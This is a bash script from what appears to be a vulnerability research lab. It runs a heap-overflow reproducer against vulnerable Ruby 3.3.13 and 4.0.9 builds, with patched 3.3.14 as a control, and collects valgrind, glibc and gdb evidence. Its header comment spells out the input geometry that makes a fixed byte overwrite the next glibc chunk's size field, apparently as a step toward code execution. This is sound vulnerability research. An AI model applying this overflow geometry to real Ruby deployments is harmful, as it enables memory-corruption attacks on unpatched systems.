#!/usr/bin/env bash
# W354: replay the mixed-parity geometry on the two other vulnerable
# branches (plain 3.3.13 and 4.0.9) with patched plain 3.3.14 as control.
# One leading 'a' then N x 0xDF (N = 27/43/59, N == 11 mod 16) makes
# capa = N+21 even and the overflow offset R = N+45 == 8 (mod 16), i.e.
# the single fixed 0x53 byte lands on the next glibc chunk's size LSB.
# Runs valgrind (write stack) on all three builds, fresh unsanitized
# processes (glibc metadata diagnostics) with an even-N safe control,
# and one gdb before/after byte read on each vulnerable build.
# Raw evidence is gitignored under lab/build/evidence/casemap-chain/w354/.
set -u
cd "$(dirname "$0")/../.." || exit 1
EVID=lab/build/evidence/casemap-chain/w354
MIXED=lab/repro/ruby2shell-rung3-mixed.rb
mkdir -p "$EVID/plain"

VULN=(lab/build/plain/ruby-3.3.13-plain lab/build/plain/ruby-4.0.9-plain)
ALL=("${VULN[@]}" lab/build/plain/ruby-3.3.14-plain)

for b in "${ALL[@]}"; do
  rb="$b/bin/ruby"
  [ -x "$rb" ] || { echo "missing $rb" >&2; exit 2; }
  ver=$(basename "$b")
  for n in 27 43 59; do
    valgrind --error-limit=no "$rb" "$MIXED" "$n" >"$EVID/vg-$ver-$n.txt" 2>&1
    rc=$?
    writes=$(grep -c 'Invalid write of size 1' "$EVID/vg-$ver-$n.txt" || true)
    reads=$(grep -c 'Invalid read of size' "$EVID/vg-$ver-$n.txt" || true)
    block=$(grep -m1 -o '0 bytes after a block of size [0-9]*' "$EVID/vg-$ver-$n.txt" || true)
    printf 'vg build=%s N=%s rc=%s writes=%s reads=%s %s\n' "$ver" "$n" "$rc" "$writes" "$reads" "$block"
  done
done

for b in "${ALL[@]}"; do
  rb="$b/bin/ruby"
  ver=$(basename "$b")
  for n in 27 43 59 28; do
    "$rb" "$MIXED" "$n" >"$EVID/plain/$ver-$n.txt" 2>&1
    rc=$?
    diag=$(grep -m1 -E 'munmap_chunk|corrupted size|invalid next size|free\(\)' "$EVID/plain/$ver-$n.txt" || true)
    printf 'plain build=%s N=%s rc=%s %s\n' "$ver" "$n" "$rc" "$diag"
  done
done

for b in "${VULN[@]}"; do
  rb="$b/bin/ruby"
  ver=$(basename "$b")
  gdb -q -batch -x "lab/repro/ruby2shell-mixed-eol-$ver.gdb" --args "$rb" "$MIXED" 27 >"$EVID/gdb-$ver-27.log" 2>&1
  printf 'gdb build=%s rc=%s\n' "$ver" "$?"
  grep -E 'BEFORE|AFTER' "$EVID/gdb-$ver-27.log"
done
